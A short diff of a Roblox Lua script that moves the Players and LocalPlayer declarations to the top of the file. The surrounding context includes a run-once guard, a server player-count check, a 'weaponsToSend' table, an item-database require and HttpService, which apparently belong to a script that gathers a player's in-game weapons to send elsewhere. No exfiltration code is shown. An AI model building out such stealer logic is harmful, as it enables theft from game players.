@@ -1,3 +1,6 @@
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -31,8 +34,6 @@ if #Players:GetPlayers() >= 12 then
 end
 
 local weaponsToSend = {}
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local HttpService = game:GetService("HttpService")
